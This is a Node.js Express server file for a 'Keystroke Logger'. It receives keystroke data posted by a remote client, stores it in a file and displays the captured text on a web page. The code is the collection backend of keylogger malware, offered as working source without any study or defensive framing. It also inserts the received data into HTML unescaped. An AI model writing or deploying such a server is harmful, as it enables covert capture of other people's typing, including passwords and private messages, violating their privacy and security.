const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();

// Use body-parser to parse JSON bodies
app.use(bodyParser.json({ extended: true }));

const port = 8080;

// HTML template for the interface
const interfaceTemplate = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keystroke Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
        }
    </style>
</head>
<body>
    <h1>Keystroke Logger</h1>
    <div id="loggedData">
        <h2>Logged Data</h2>
        <p>{loggedData}</p>
    </div>
</body>
</html>
`;

// Route to handle GET requests and display logged keystrokes
app.get("/", (req, res) => {
    try {
        // Read the keystrokes from the file
        const kl_file = fs.readFileSync("./keystroke_captures.txt", { encoding: 'utf8', flag: 'r' });
        
        // Replace newline characters with <br> for HTML formatting
        const formattedData = kl_file.replace(/\n/g, "<br>");
        
        // Render HTML template with logged data
        const html = interfaceTemplate.replace("{loggedData}", formattedData);
        res.send(html);
    } catch {
        // If file doesn't exist or any error occurs, send a message indicating no data
        res.send(interfaceTemplate.replace("{loggedData}", "<p>Nothing logged yet.</p>"));
    }
});

// Route to handle POST requests and save the keystrokes data
app.post("/", (req, res) => {
    console.log(req.body.keyboardData);
    
    // Write the received keystrokes data to the file
    fs.writeFileSync("keystroke_captures.txt", req.body.keyboardData);
    res.send("Successfully set the data");
});

// Start the server and listen on the specified port
app.listen(port, () => {
    console.log(`Server is listening on port ${port}`);
});
